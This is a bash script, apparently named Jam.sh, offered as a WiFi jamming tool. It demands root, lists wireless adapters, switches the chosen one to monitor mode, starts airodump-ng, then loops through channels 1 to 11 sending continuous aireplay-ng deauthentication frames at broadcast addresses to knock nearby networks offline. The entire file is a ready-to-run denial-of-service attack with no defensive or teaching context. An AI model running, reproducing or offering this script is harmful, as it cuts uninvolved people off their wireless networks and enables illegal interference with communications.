#!/bin/bash
# -------------------------------------------------------------------------- #
# Author     : Fattcat
# YT Channel : https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ
# -------------------------------------------------------------------------- #

# Check if the script is run with sudo
if [ "$(id -u)" -ne 0 ]; then
  echo "------------------------------------------------------------" | lolcat
  echo "[+] \e[31mCANT START WITHOUT SUDO PERMISSION\e[0m [+]" | lolcat
  echo "[+] Please start this script with                       [+]" | lolcat
  echo "[+]         --> \e[31msudo ./Jam.sh\e[0m                           [+]" | lolcat
  echo "------------------------------------------------------------" | lolcat
  exit 1
fi

# List connected WiFi adapters
echo "List of connected WiFi Adapters :" | lolcat
index=1
for adapter in $(iwconfig 2>/dev/null | grep 'IEEE\|ESSID' | cut -d ' ' -f 1); do
  echo "[+] $index. $adapter --> ($(iwconfig $adapter | grep ESSID | cut -d ':' -f 2 | tr -d '"'))" | lolcat
  ((index++))
done

# Prompt to pick a WiFi adapter
read -p "Pick number of wifi adapter: " adapter_number

# Get the selected WiFi adapter
selected_adapter=$(iwconfig | grep 'IEEE\|ESSID' | cut -d ' ' -f 1 | sed -n "${adapter_number}p")

# Set monitor mode on the selected WiFi adapter
echo "Setting monitor mode on $selected_adapter..." | lolcat
iwconfig $selected_adapter mode monitor

# Wait for 3 seconds for monitor mode to be set
sleep 3

# Start airodump-ng on the selected WiFi adapter
echo "Starting airodump-ng on $selected_adapter..." | lolcat
xterm -e "airodump-ng $selected_adapter" & disown

# Wait for 10 seconds before initiating WiFi disruption
sleep 10

# Disrupt WiFi networks on channels 1 to 11
for channel in {1..11}; do
  echo "Disrupting WiFi networks on channel $channel..." | lolcat
  aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF -e JammingNetwork $selected_adapter
  sleep 2  # Adjust the delay between disruptions as needed
done
